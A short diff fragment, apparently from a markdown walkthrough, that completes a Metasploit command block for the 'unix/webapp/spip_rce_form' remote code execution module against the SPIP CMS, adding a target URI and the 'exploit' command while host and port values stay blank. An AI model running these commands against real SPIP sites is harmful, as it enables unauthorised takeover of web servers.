@@ -100,7 +100,8 @@ use exploit unix/webapp/spip_rce_form
 set rhosts --
 set lhost --
 set lport --
-set 
+set targeturi spip/
+exploit
 ```
 
 
